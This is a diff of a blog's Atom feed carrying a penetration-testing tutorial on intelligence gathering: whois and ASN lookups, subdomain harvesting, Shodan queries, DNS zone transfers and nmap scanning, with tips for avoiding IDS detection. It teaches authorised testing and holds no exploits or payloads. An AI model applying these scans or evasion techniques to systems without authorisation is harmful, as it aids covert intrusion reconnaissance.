@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[tech.bitvijays.com]]></title>
+  <title><![CDATA[My Octopress Blog]]></title>
   <link href="http://bitvijays.github.io/atom.xml" rel="self"/>
   <link href="http://bitvijays.github.io/"/>
-  <updated>2015-08-06T21:38:31+01:00</updated>
+  <updated>2016-04-21T01:06:42+05:30</updated>
   <id>http://bitvijays.github.io/</id>
   <author>
-    <name><![CDATA[Vijay Kumar]]></name>
+    <name><![CDATA[Your Name]]></name>
     
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
@@ -16,26 +16,61 @@
   <entry>
     <title type="html"><![CDATA[Learning From the Field: Intelligence Gathering]]></title>
     <link href="http://bitvijays.github.io/blog/2015/04/09/learning-from-the-field-intelligence-gathering/"/>
-    <updated>2015-04-09T05:53:38+01:00</updated>
+    <updated>2015-04-09T10:23:38+05:30</updated>
     <id>http://bitvijays.github.io/blog/2015/04/09/learning-from-the-field-intelligence-gathering</id>
     <content type="html"><![CDATA[<p>This post (always Work in Progress) would list the technical steps which might be important while doing the intelligence gathering of an organization and we only know the company name or it&rsquo;s domain name such as example.com.</p>
 
 <!-- more -->
 
 
-<h3>Thanks to Vulnhub-ctf team, bonsaiviking, Rajesh and Tanoy.</h3>
+<h3>Thanks to Vulnhub-ctf team, bonsaiviking, recrudesce, Rajesh and Tanoy.</h3>
 
-<p>Suppose, we have to do a external/internal pentest of a big organization with DMZ, Data Centers, Telecom Network etc.</p>
+<p>Suppose, we have to do a external/ internal pentest of a big organization with DMZ, Data centers, Telecom network etc. We can either do <strong>Passive fingerprinting</strong> ( method to learn more about the enemy, without them knowing it ) or <strong>Active fingerprinting</strong> ( process of transmitting packets to a remote host and analysing corresponding replies ).
+<br>
+<br>
+<strong>Passive fingerprinting</strong> and <strong>Active fingerprinting</strong> can be done by using various methods such as</p>
+
+
+
+<table class="tg">
+  <tr>
+    <th class="tg-e3zv">Passive Fingerprinting              </th>
+    <th class="tg-e3zv">Active Fingerprintering</th>
+  </tr>
+  <tr>
+    <td class="tg-031e">- whois</td>
+    <td class="tg-031e">- Finding DNS, MX, AAAA, A</td>
+  </tr>
+  <tr>
+    <td class="tg-031e">- ASN Number</td>
+    <td class="tg-031e">- DNS Zone Transfer</td>
+  </tr>
+  <tr>
+    <td class="tg-031e">- Enumeration with Domain Name</td>
+    <td class="tg-031e">- SRV Records</td>
+  </tr>
+  <tr>
+    <td class="tg-yw4l">- Publicly available scans of IP Addresses         </td>
+    <td class="tg-yw4l">- Port Scanning</td>
+  </tr>
+  <tr>
+    <td class="tg-yw4l">- Reverse DNS Lookup using External Websites         </td>
+    <td class="tg-yw4l">-</td>
+  </tr>
+</table>
+
+
+<p><br></p>
 
 <ol>
 <li><strong>Passive Fingerprinting:</strong>
 <ol>
-<li><strong>Whois</strong>: provide information about the registered users or assignees of an Internet Resource, such as Domain name, an IP address block, or an autonomous system.
+<li><strong>Whois</strong>: provide information about the registered users or assignees of an Internet resource, such as Domain name, an IP address block, or an autonomous system.
 <br><br>
 whois command acts differently for ip address and domain name. 
 <ul>
-<li>In Domain name it just provides registar name etc</li> 
-<li>In IP address it provides the netblock ASN Number etc.</li>
+<li>In Domain name it just provides registrar name etc.</li> 
+<li>In IP address it provides the net-block ASN Number etc.</li>
 </ul>
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -47,14 +82,15 @@ ASN Number and information could be found by using Team CMRU whois service
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>whois -h whois.cymru.com " -v 216.90.108.31"</span></code></pre></td></tr></table></div></figure>
 If you want to do bulk queries refer @ <a href="http://www.team-cymru.org/IP-ASN-mapping.html">IP-ASN-Mapping-Team-CYMRU</a>
+<br>
+<br>
+Hurricane Electric Internet Services also provide a website <a href="http://bgp.he.net">BGP Toolkit</a> which provides your IP Address ASN or search function by Name, IP address etc. It also provides AS Peers which might help in gathering more information about the company in terms of it's neighbors. 
 <br><br>
 TODO: Commandline checking of subnet and making whois query efficient.<br>
 </li>
-</ol>
- </li>
-<li><strong>Active Fingerprintering:</strong>
-<ol>
-<li>If you have domain name you could use
+<br>
+<br>
+<li><strong>Enumeration with Domain Name (e.g example.com) using external websites</strong>: If you have domain name you could use
 <ul>
 <li><strong>DNS Dumpster API</strong> to know the various sub-domain related to that domain.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -89,15 +125,19 @@ and the various dns queries by
 <ul>
 <li> use recon/domains-hosts/bing_domain_web : Harvests hosts from Bing.com by using the site search operator.</li>
 <li> use recon/domains-hosts/google_site_web : Harvests hosts from google.com by using the site search operator.</li>
+<li> use recon/domains-hosts/brute_hosts     : Brute forces host names using DNS.</li>
 <li> use recon/hosts-hosts/resolve           : Resolves the IP address for a host.</li>
 <li> use reporting/csv                       : Creates a CSV file containing the specified harvested data.</li>
 </ul>
 <br>
+Jason Haddix has created a dynamic resource script for sub-domain discovery which is available <a href="https://github.com/jhaddix/domain">here</a>. Simply put the domain name and it runs the necessary modules, creates a new workspace and save the report. 
+<br>
+<br>
 TODO: Check API option too, why google_site_web is failing, add a module to add ASN Info and Location Info too.
 </li>
-
-<li><strong>The Harvestor:</strong>
-<br>The harvestor provides a email address, virtual hosts different domains, shodan results for the domain. Provides really good results, especially if you combine with shodan results as it may provide server versions and what&#8217;s OS is running on the IP address.
+<br> 
+<li><strong>The Harvester:</strong>
+<br>The harvester provides a email address, virtual hosts, different domains, shodan results for the domain. Provides really good results, especially if you combine with shodan results as it may provide server versions and what's OS is running on the IP address.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -125,6 +165,7 @@ TODO: Check API option too, why google_site_web is failing, add a module to add 
 
 TODO: Combine these results with recon-ng and DNS Dumpsters and create one csv with all results.
 </li>
+<br>
 <li><strong>Google search operators</strong>
 <ul>
 <li><strong>site</strong>: Get results from certain sites or domains.</li>
@@ -133,19 +174,80 @@ TODO: Combine these results with recon-ng and DNS Dumpsters and create one csv w
 <li><strong>allintitle/intitle</strong>:Restricts results to those containing all the query terms you specify in the title.</li>
 </ul>
 Three good places to refer are <a href="https://support.google.com/websearch/answer/2466433">Search Operators</a>, <a href="https://sites.google.com/site/gwebsearcheducation/advanced-operators">Advanced Operators</a> and <a href="https://www.exploit-db.com/google-hacking-database/">Google Hacking Database</a>.
+<br>
+<br>
+Another two important tools are 
+<ul>
+<li><a href="http://www.mcafee.com/in/downloads/free-tools/sitedigger.aspx">Mcafee Site Digger</a> which searches Google’s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites.</li>
+<li><a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/"><strong>SearchDiggity v3</strong></a>: It is Bishop Fox’s MS Windows GUI application that serves as a front-end to the most recent versions of our Diggity tools: GoogleDiggity, BingDiggity, Bing LinkFromDomainDiggity, CodeSearchDiggity, DLPDiggity, FlashDiggity, MalwareDiggity, PortScanDiggity, SHODANDiggity, BingBinaryMalwareSearch, and NotInMyBackYard Diggity.</a></li>
+</ul>
 </li>
+<br>
 <li><strong>Publicly available scans of IP Addresses</strong>
 <ul>
 <li><a href="https://exfiltrated.com/"><strong>Exfiltrated</strong></a>: It provides the scans from the 2012 Internet Census. It would provide the IP address and the port number running at the time of scan in the year 2012.</li>
 <li><a href="https://www.shodan.io/"><strong>Shodan</strong></a>: Shodan provides the same results may be with recent scans. You need to be logined. Shodan CLI is available at <a href="https://cli.shodan.io/">Shodan Command-Line Interface</a></li>
+<br>
+Shodan Queries
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>title: Search the content scraped from the HTML tag
+</span><span class='line'>html: Search the full HTML content of the returned page
+</span><span class='line'>product: Search the name of the software or product identified in the banner
+</span><span class='line'>net: Search a given netblock (example: 204.51.94.79/18)
+</span><span class='line'>version: Search the version of the product
+</span><span class='line'>port: Search for a specific port or ports
+</span><span class='line'>os: Search for a specific operating system name
+</span><span class='line'>country: Search for results in a given country (2-letter code)
+</span><span class='line'>city: Search for results in a given city</span></code></pre></td></tr></table></div></figure>
 TODO: Learn how to access Shodan with API.
-<li><a href="http://www.netmux.com/"><strong>Netmux</strong></a>: NETMUX is the all-source information hub about every IP address, device, IOT, or domain on the internet.All with a single query</li>
+<li><a href="http://www.netmux.com/"><strong>Netmux</strong></a>: NETMUX is the all-source information hub about every IP address, device, IOT, or domain on the internet. All with a single query.</li>
+<li><a href="https://censys.io/"><strong>Censys</strong></a>: Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. A good feature is the Query metadata which tells the number of Http,https and other protocols found in the IP network range.
+<br>
+Censys.io queries
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip:192.168.0.0/24 -- CIDR notation</span></code></pre></td></tr></table></div></figure></li>
 </ul>
 </li>
 </ul>
 </li>
+<li><strong>Reverse DNS Lookup using External Websites:</strong> Even after doing the above, sometimes we miss few of the domain name. Example: Recenlty, In one of our engagement, the domain name was example.com and the asn netblock was 192.168.0.0/24. We did recon-ng, theharvester, DNS reverse-lookup via nmap. Still, we missed few of the websites hosted on same netblock but with different domain such as exam.in. We can find such entries by using ReverseIP lookup by 
+<ul>
+<li><a href="http://reverseip.domaintools.com">Reverse IP Lookup by Domaintools</a>: Domain name search tool that allows a wildcard search, monitoring of WHOIS record changes and history caching, as well as Reverse IP queries.</li>
+<li><a href="https://www.passivetotal.org/">Passive Total</a> : A threat-analysis platform created for analysts, by analysts.</li>
+<li><a href="http://serversniff.net.ipaddress.com/">Server Sniff</a> :  A website providing IP Lookup, Reverse IP services.</li>
+<li><a href="https://www.robtex.com/">Robtex</a> : Robtex is one of the world's largest network tools. At robtex.com, you will find everything you need to know about domains, DNS, IP, Routes, Autonomous Systems, etc.
+
+There's a nmap nse <a href="https://nmap.org/nsedoc/scripts/http-robtex-reverse-ip.html">http-robtex-reverse-ip</a> which can be used to find the domain/website hosted on that ip.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-robtex-reverse-ip --script-args http-robtex-reverse-ip.host='XX.XX.78.214'
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-20 21:39 IST
+</span><span class='line'>Pre-scan script results:
+</span><span class='line'>| http-robtex-reverse-ip: 
+</span><span class='line'>|   xxxxxxindian.com
+</span><span class='line'>|_  www.xxxxxindian.com</span></code></pre></td></tr></table></div></figure>
+ </li>
+</ul></li>
+</ol>
+ </li>
+<li><strong>Active Fingerprinting:</strong>
+<ol>
 Above all methods, would help you to provide information without actually interacting with the client infrastructure.
-<li>Most probably by now we have gathered all the public available information without interacting with client infrastructure. Next, we can use <strong>DNS enumeration</strong> to gather more information about the client. The below information could gather externally as well as internally. However, amount of information gathered from internal network would definately be more than when done externally.
+<li>Most probably by now we have gathered all the public available information without interacting with client infrastructure. Next, we can use <strong>DNS enumeration</strong> to gather more information about the client. The below information could gather externally as well as internally. However, amount of information gathered from internal network would definitely be more than when done externally.
 <br>
 <br>
 <strong>Finding DNS, MX, AAAA, A using</strong> 
@@ -189,11 +291,11 @@ Using
 <li><strong>host:</strong>
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>host -l &lt;Domain Name&gt; &lt;DNS Server&gt;</span></code></pre></td></tr></table></div></figure>
-Try zonetransfer using host for zonetransfer.me using their nameservers. </li>
+Try zonetransfer using host for zonetransfer.me using their name servers. </li>
 <li><strong>Dig:</strong>
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>dig axfr &lt;domain_name&gt; @nameserver</span></code></pre></td></tr></table></div></figure>
-Try zonetransfer using dig for zonetransfer.me using their nameservers.</li>
+Try zonetransfer using dig for zonetransfer.me using their name servers.</li>
 <li><strong>dnsrecon</strong>
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d &lt;domain&gt; -t axfr</span></code></pre></td></tr></table></div></figure>
@@ -205,7 +307,11 @@ dnsrecon could also be used for other purposes such as finding nameservers, mail
 </span><span class='line'>-r, --range       &lt;range&gt;           IP Range for reverse look-up brute force in formats (first-last) or in (range/bitmask).
 </span><span class='line'>-n, --name_server &lt;name&gt;            Domain server to use, if none is given the SOA of the target will be used</span></code></pre></td></tr></table></div></figure>
 </li>
-Ideally, we should try every DNS server to do a zone transfer because there might be a probablity of one mis-configured dns server. Also, DigiNinja a well known security researcher has made the domain zonetransfer.me available for testing and learning, so you can test the online zone transfer and other queries with the deliberately configured zone transfer capable domain.
+<li><strong>DNSEnum: </strong>DNS Enumeration tool
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum &lt;domain&gt;</span></code></pre></td></tr></table></div></figure></li>
+Ideally, we should try every DNS server to do a zone transfer because there might be a probability of one mis-configured dns server. Also, DigiNinja a well known security researcher has made the domain zonetransfer.me available for testing and learning, so you can test the online zone transfer and other queries with the deliberately configured zone transfer capable domain.
+
 <br><br>
 </ul></li>
 <li><strong>SRV Records:</strong><br>
@@ -285,19 +391,16 @@ SRV records are used by the below standardized communication protocols.
 </span><span class='line'>Libravatar uses SRV records to locate avatar image servers
 </span><span class='line'>Microsoft Lync
 </span><span class='line'>Citrix Receiver</span></code></pre></td></tr></table></div></figure>
-
 Checkout the brute_srv function in the dnsrecon tool script to get familar with the different SRV names and services.
 </li>
-
-<li><strong>DNSEnum: </strong>DNS Enumaration tool
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum &lt;domain&gt;</span></code></pre></td></tr></table></div></figure></li>
 </ul>
 </li>
 </ol>
+<br>
+<br>
 <li><strong>Internal Infrastructure Mapping:</strong>
 <br>
-All the steps in 2.b which are DNS related recon could also be performed in the internal penetration testing provided we have the access to the internal DNS Server. After, we have gathered all the information from DNS enumeration, still we haven&#8217;t enumerated internal infrastructure. We apply the below methods to enumerate further.
+All the steps in 2.a which are DNS related recon could also be performed in the internal penetration testing provided we have the access to the internal DNS Server. After, we have gathered all the information from DNS enumeration, still we haven't enumerated internal infrastructure. We apply the below methods to enumerate further.
 <br>
 <ol>
 <li>
@@ -338,12 +441,12 @@ Nmap provides a List scan option which does the reverse lookup. It provides the 
 <li><strong>Identifying Alive IP Addresses:</strong><br>
 Nmap by default provides a -sn Ping scan option. The default host discovery done with -sn consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. This works as if ICMP echo request is blocked, nmap would know if a host is alive if it receives any response from port 443 or 80 or timestamp reply.
 <br><br>
-Let&#8217;s see what the nmap does when do a ping scan.
+Let's see what the nmap does when do a ping scan.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn -n 10.0.0.230
 </span><span class='line'>#My IP is 10.0.0.1</span></code></pre></td></tr></table></div></figure>
-It is very important to mention that -n option (No DNS resolution) should be used going forward as we have already did DNS resolution while using List scan. Since DNS can be slow even with Nmap&#8217;s built-in parallel stub resolver, this option can slash scanning times.
+It is very important to mention that -n option (No DNS resolution) should be used going forward as we have already did DNS resolution while using List scan. Since DNS can be slow even with Nmap's built-in parallel stub resolver, this option can slash scanning times.
 <br><br>
 TCP Dump output is presented here. As both the IP address are in the same subnet, nmap would use ARP Ping scan to find the alive IP Address.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -351,7 +454,7 @@ TCP Dump output is presented here. As both the IP address are in the same subnet
 </pre></td><td class='code'><pre><code class=''><span class='line'>22:11:27.292054 ARP, Request who-has 10.0.0.230 (Broadcast) tell 10.0.0.1, length 28
 </span><span class='line'>22:11:27.361100 ARP, Reply 10.0.0.230 is-at 8c:64:22:3b:2b:2d (oui Unknown), length 28</span></code></pre></td></tr></table></div></figure>
 
-However, this behavior can be changed using &#8211;disable-arp-ping
+However, this behavior can be changed using --disable-arp-ping
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn 10.0.0.230 --disable-arp-ping</span></code></pre></td></tr></table></div></figure>
 TCPdump output is as below: One ICMP Echo Request, SYN to Port 443, ACK to Port 80 and a time stamp request.
@@ -372,7 +475,7 @@ TCPdump output is as below: One ICMP Echo Request, SYN to Port 443, ACK to Port 
 </span><span class='line'>22:14:02.805083 IP 10.0.0.230.http &gt; 10.0.0.1.59246: Flags [R], seq 3994420539, win 0, length 0
 </span><span class='line'>22:14:02.805930 IP 10.0.0.230 &gt; 10.0.0.1: ICMP time stamp reply id 38635 seq 0: org 00:00:00.000, recv 16:40:52.731, xmit 16:40:52.731, length 20</span></code></pre></td></tr></table></div></figure>
 
-If you use &#8211;reason option, nmap would tell why it thinks the host is alive. In the below case (received echo-reply).
+If you use --reason option, nmap would tell why it thinks the host is alive. In the below case (received echo-reply).
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 10.0.0.230
@@ -389,7 +492,7 @@ TCP Dump output:
 
 Please note, this ICMP scan would miss all the host which are alive but the firewall is dropping the ICMP echo request packet. However, if you want to find more hosts, it would be advisable to separate the list of IPs which responded to ICMP from the IP address scan range and run the scan again may be with SYN to 443 and ACK to 80 using PA, PS options.
 <br><br>
-Please also note Nmap&#8217;s ICMP ping, by default, sends zero data as part of the ping. Nmap typically pings the host via icmp if the user has root privileges, and uses a tcp-ping otherwise. This is easily detected by the Snort IDS Rule 1-469 <a href="https://www.snort.org/rule_docs/1-469">SID 1-469</a>.
+Please also note Nmap's ICMP ping, by default, sends zero data as part of the ping. Nmap typically pings the host via icmp if the user has root privileges, and uses a tcp-ping otherwise. This is easily detected by the Snort IDS Rule 1-469 <a href="https://www.snort.org/rule_docs/1-469">SID 1-469</a>.
 <br><br>
 This could be evaded by using 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -420,14 +523,14 @@ Once you have the list of IP Addresses which are alive, we can do port scan on t
 </span><span class='line'>-sU UDP Scan 
 </span><span class='line'>-sA ACK Scan : Ack scan is generally used to map out firewall rulesets. Whether firewall is stateful or not.</span></code></pre></td></tr></table></div></figure> 
 
-Please note p0f recognizes Nmap&#8217;s SYN scan because of the TCP Options such as TCP window size a multiple of 1024, and only the MSS option supported with a value of 1460 (Check the tcpdump output of Ping scan above, SYN Packet). Recently, a IRC user was getting filtered port while using SYN Scan whereas was getting OPN ports which using telnet or TCP Connect Scan.
+Please note p0f recognizes Nmap's SYN scan because of the TCP Options such as TCP window size a multiple of 1024, and only the MSS option supported with a value of 1460 (Check the tcpdump output of Ping scan above, SYN Packet). Recently, a IRC user was getting filtered port while using SYN Scan whereas was getting OPN ports which using telnet or TCP Connect Scan.
 
 Also, A patch to allow a user to override the TCP Window size in SYN scan was just posted to the <a href="http://seclists.org/nmap-dev/2015/q3/52">Nmap Development List</a>.
 
 <br><br>
-By default, nmap scans the 1000 most popular ports of each protocol ( gathered by scanning million of IP address). Scanning 1000 ports in an unknown environment with 16 million IP Address could be challenging. Nmap also provides -F Fast scan option which scans the 100 most common ports in each protocol. Otherwise it also provides &#8211;top-ports to specify an arbitary number of ports.
+By default, nmap scans the 1000 most popular ports of each protocol ( gathered by scanning million of IP address). Scanning 1000 ports in an unknown environment with 16 million IP Address could be challenging. Nmap also provides -F Fast scan option which scans the 100 most common ports in each protocol. Otherwise it also provides --top-ports to specify an arbitrary number of ports.
 <br><br>
-So, How do we know what are the ports scanned with &#8211;top-ports option. This could be found by
+So, How do we know what are the ports scanned with --top-ports option. This could be found by
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sT -oG - -v | grep '^# Ports'</span></code></pre></td></tr></table></div></figure>
 or
@@ -443,17 +546,17 @@ We could provide ports to nmap by using -p option also, for example
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>-p 22 : Scan single port
-</span><span class='line'>-p 22,25,80 : Scan multiple ports with comma separated values. If -sS is specfied TCP ports would be scanned. If -sU UDP Scan is specified, UDP Ports would be scanned.
+</span><span class='line'>-p 22,25,80 : Scan multiple ports with comma separated values. If -sS is specified TCP ports would be scanned. If -sU UDP Scan is specified, UDP Ports would be scanned.
 </span><span class='line'>-p80-85, 443, 8000-8005 : Scan port with ranges.
 </span><span class='line'>-p- : Scan all the ports excluding 0.
-</span><span class='line'>-pT:21,22,25,U:53,111,161 : Scan TCP 21,22,25 and UDP Ports 53,111,161. -sU must also be specfied.
-</span><span class='line'>-p http* : wildcards may be used for ports with similar names. This would match nine ports including 80,280,443,591,593,8000,8008,8080,8443.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>-pT:21,22,25,U:53,111,161 : Scan TCP 21,22,25 and UDP Ports 53,111,161. -sU must also be specified.
+</span><span class='line'>-p http* : wild cards may be used for ports with similar names. This would match nine ports including 80,280,443,591,593,8000,8008,8080,8443.</span></code></pre></td></tr></table></div></figure>
 
 <strong>Identifying service versions:</strong>
 <br>
 Ideally, we can use -sV to probe the ports to find the version running. When performing a version scan (-sV), Nmap sends a series of probes, each of which is assigned a rarity value between one and nine.  The higher the number, the more likely it is the service will be correctly identified. However, high intensity scans take longer. The intensity must be between 0 and 9. The default is 7.
 <br><br>
-Ideally, to avoid the IDS Detection, we should avoid using -sV option. However, we can keep the noise less by using &#8211;version intensity by which we can control the number of probes sent to determine the service. Setting this option to 0 will send only the Null probe (connect and wait for banner) and any probes that have been specifically listed as pertaining to the scanned port in nmap-service-probes. The other options available are below:
+Ideally, to avoid the IDS Detection, we should avoid using -sV option. However, we can keep the noise less by using --version intensity by which we can control the number of probes sent to determine the service. Setting this option to 0 will send only the Null probe (connect and wait for banner) and any probes that have been specifically listed as pertaining to the scanned port in nmap-service-probes. The other options available are below:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -461,14 +564,14 @@ Ideally, to avoid the IDS Detection, we should avoid using -sV option. However, 
 </span><span class='line'>--version-all (Try every single probe) : An alias for --version-intensity 9
 </span><span class='line'>--version-trace (Trace version scan activity) : Print debugging information.</span></code></pre></td></tr></table></div></figure>
 
-Also, when -sV is specified apart from the probes, all the scripts in the <a href="https://nmap.org/nsedoc/categories/version.html">Version</a> category are executed. These scripts could be prevented from running by removing them from the script.db catalog or by building Nmap without NSE support (./configure &#8211;without-liblua). However, if &#8211;version-intensity option is less than 7, those scripts won&#8217;t be executed ( I might be a little wrong here).
+Also, when -sV is specified apart from the probes, all the scripts in the <a href="https://nmap.org/nsedoc/categories/version.html">Version</a> category are executed. These scripts could be prevented from running by removing them from the script.db catalog or by building Nmap without NSE support (./configure --without-liblua). However, if --version-intensity option is less than 7, those scripts won't be executed ( I might be a little wrong here).
 <br>
 So our scan would become approx
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>nmap &lt;IP_Address_Range&gt; -n --top-ports &lt;number&gt;/-p &lt;Custom Port List&gt; -sV --version-intensity 0/ (No -sV)</span></code></pre></td></tr></table></div></figure>
 
 <strong>Performance:</strong>
-So, How can we improve the performance of our nmap scan, so that result could be achieved faster. However, as always we will have Time Vs Accuracy Tradeoff.
+So, How can we improve the performance of our nmap scan, so that result could be achieved faster. However, as always we will have Time Vs Accuracy Trade off.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -486,18 +589,18 @@ So, How can we improve the performance of our nmap scan, so that result could be
 
 T0,T1,T2 is specifically for IDS Evasion. T3 is the default.<br>
 
-We can set max-retries to a lower value such as 2. Currently it&#8217;s 10 for T0,T1,T2,T3; 6 for T4 and 2 for T5.
+We can set max-retries to a lower value such as 2. Currently it's 10 for T0,T1,T2,T3; 6 for T4 and 2 for T5.
 <br><br>
 <strong>Nmap Scripts:</strong>
 <br>
 As bonsaiviking says <a href="http://blog.bonsaiviking.com/2015/07/they-see-me-scannin-part-2.html">Here</a>:<br>
-If you are wild enough to try NSE scripts against an IDS-protected target, you should know how to read Lua, since the script sources are the final authority on what data is sent. But if you&#8217;re just looking to get a little better at blending in, these tips should help:
+If you are wild enough to try NSE scripts against an IDS-protected target, you should know how to read Lua, since the script sources are the final authority on what data is sent. But if you're just looking to get a little better at blending in, these tips should help:
 <ul>
-<li>Use &#8211;script-args-file to pass script arguments to Nmap from a file. This will keep your command line clean and make it harder to accidentally miss one of the options you choose</li>
+<li>Use --script-args-file to pass script arguments to Nmap from a file. This will keep your command line clean and make it harder to accidentally miss one of the options you choose</li>
 <li>Obviously avoid dos, intrusive, and exploit category scripts.</li>
 <li>Use scripts by name instead of by category, so that you know exactly what will be run.</li>
 <li>Thoroughly read the documentation for each script you intend to use.</li>
-<li>Set http.useragent to something believable that blends in. Currently, The HTTP scripts all use a User-Agent header that identifies as &#8220;Nmap Scripting Engine.&#8221;</li>
+<li>Set http.useragent to something believable that blends in. Currently, The HTTP scripts all use a User-Agent header that identifies as "Nmap Scripting Engine."</li>
 </ul>
 <br>
 <strong>Output Options:</strong>
@@ -514,27 +617,38 @@ If you are wild enough to try NSE scripts against an IDS-protected target, you s
 </span><span class='line'>--packet-trace: Show all packets sent and received
 </span><span class='line'>--resume &lt;filename&gt;: Resume an aborted scan : Filename should be .nmap or .gnmap</span></code></pre></td></tr></table></div></figure>
 
-At this point, it&#8217;s good to find what are the most common ports open in the scan we just performed by
+At this point, it's good to find what are the most common ports open in the scan we just performed by
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>grep "^[0-9]\+" &lt;nmap file .nmap extension&gt; | grep "\ open\ " | sort | uniq -c | sort -rn | awk '{print "\""$1"\",\""$2"\",\""$3"\",\""$4"\",\""$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13"\""}' &gt; test.csv</span></code></pre></td></tr></table></div></figure>
 </li>
 <li><strong>Exploring the Network Further:</strong><br>
 By now, we would have information about what ports are open and possibly what services are running on them. Further, we need to explore the various options by which we can get more information.<br>
 <ul>
+<br>
 <strong>Gathering Screenshots for http* services:</strong><br>
 
-There are three ways (in my knowledge to do this)
-<li>http-screenshot NSE:<br> Nmap has a NSE script <a href="https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse">http-screenshot</a> This could be executed while running nmap. It uses wkhtml2image tool in the script. Sometimes, you may find that running this script takes a long time. It might be a good idea to gather all the http* running IP, Port and provide this information to wkhtml2image directly via scripting. You do have to install wkhtml2image and test with disable javascript and other options available.</li>
-<li>httpscreenshot from breenmachine: <a href="https://github.com/breenmachine/httpscreenshot">httpscreenshot</a>  is a tool for grabbing screenshots and HTML of large numbers of websites. The goal is for it to be both thorough and fast which can sometimes oppose each other.</li>
+There are four ways (in my knowledge to do this)
+<li><strong>http-screenshot NSE</strong>:<br> Nmap has a NSE script <a href="https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse">http-screenshot</a> This could be executed while running nmap. It uses wkhtml2image tool in the script. Sometimes, you may find that running this script takes a long time. It might be a good idea to gather all the http* running IP, Port and provide this information to wkhtml2image directly via scripting. You do have to install wkhtml2image and test with disable javascript and other options available.</li>
+<li><strong>httpscreenshot</strong> from breenmachine: <a href="https://github.com/breenmachine/httpscreenshot">httpscreenshot</a>  is a tool for grabbing screenshots and HTML of large numbers of websites. The goal is for it to be both thorough and fast which can sometimes oppose each other.</li>
